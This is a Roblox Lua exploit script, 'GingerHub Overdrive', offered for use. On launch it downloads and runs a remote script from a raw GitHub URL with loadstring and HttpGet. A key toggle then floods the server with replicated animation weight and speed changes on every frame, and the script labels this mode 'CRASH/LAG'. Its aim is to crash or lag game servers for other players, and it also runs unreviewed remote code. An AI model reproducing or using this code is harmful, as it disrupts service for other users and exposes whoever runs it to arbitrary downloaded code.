-- // GINGERHUB OVERDRIVE [ULTIMATE EDITION - JAN 2026] \\ --

local GINGERHUB_LINK = "https://raw.githubusercontent.com/panoww07/gingerhub/refs/heads/main/apstein.lua"
local active = false
local player = game.Players.LocalPlayer
local confusionId = "rbxassetid://15264639453" -- High-density ID

-- 1. LOADER FOR YOUR HUB
task.spawn(function()
    pcall(function() loadstring(game:HttpGet(GINGERHUB_LINK))() end)
end)

-- 2. NOTIFICATION SYSTEM
local function alert(msg)
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Ginger Overdrive",
        Text = msg,
        Duration = 2
    })
end

-- 3. KEYBOARD TOGGLE (K)
game:GetService("UserInputService").InputBegan:Connect(function(i, g)
    if not g and i.KeyCode == Enum.KeyCode.K then
        active = not active
        alert(active and "MODE: CRASH/LAG (ON)" or "MODE: STABLE (OFF)")
    end
end)

-- 4. THE OVERDRIVE ENGINE
game:GetService("RunService").Heartbeat:Connect(function()
    if active then
        local char = player.Character
        local animator = char and char:FindFirstChildOfClass("Humanoid") and char:FindFirstChildOfClass("Humanoid"):FindFirstChildOfClass("Animator")
        
        if animator then
            -- BYPASS: Instantly clear all 32 slots before they fill
            for _, track in pairs(animator:GetPlayingAnimationTracks()) do
                track:Destroy()
            end

            -- PAYLOAD: One track, infinite stress
            local a = Instance.new("Animation")
            a.AnimationId = confusionId
            local success, t = pcall(function() return animator:LoadAnimation(a) end)
            
            if success and t then
                t:Play()

                -- EXTREME DATA FLOOD
                -- This uses high-precision math to stress the Server-Side replication
                for i = 1, 1000 do 
                    local weight = math.random(1, 10000000) / 100
                    local speed = math.random(1, 10000000) / 100
                    t:AdjustWeight(weight)
                    t:AdjustSpeed(speed)
                end
                
                -- Protect your own client from freezing
                task.spawn(function()
                    task.wait()
                    t:Destroy()
                    a:Destroy()
                end)
            end
        end
    end
end)
